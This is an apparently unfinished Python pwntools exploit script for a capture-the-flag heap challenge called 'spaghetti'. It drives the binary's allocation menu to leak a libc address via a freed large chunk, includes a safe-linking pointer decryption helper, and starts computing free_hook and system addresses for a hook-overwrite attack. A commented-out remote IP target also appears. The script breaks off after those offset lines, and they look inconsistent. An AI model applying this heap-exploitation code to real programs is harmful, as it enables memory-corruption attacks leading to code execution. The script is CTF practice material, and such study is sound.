from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

context.terminal = ['tmux', 'splitw', '-h']
binaryname = "./spaghetti"
#p=process(binaryname)
#p=remote("207.154.239.148", 1369)
p=gdb.debug(binaryname, gdbscript=gs)
#gdb.attach(p)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak

def decrypt(cipher):
    key=0
    for i in range(1,6):
        bits=64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain


def getleak(resp):
    rleak = resp.split(b"index?\n> ")[1].split(b"\nYou")[0]
    return u64(rleak.ljust(8, b"\x00"))

malloc(0,1049)
malloc(1,24)

free(0)
#resp = view(0)
malloc(42,1100)

resp = view(0)
leak = getleak(resp)
#we have a our leak, using vmmap see that glib c address and find offset
forever_offset =0x1ECBE0

glibcbase = leak - forever_offset
print(hex(glibcbase))

free_hookOffset = glibcbase - 0x7e0fb0fe4e40

system_offset = glibcbase - 0x7e0fb0e4e3c0



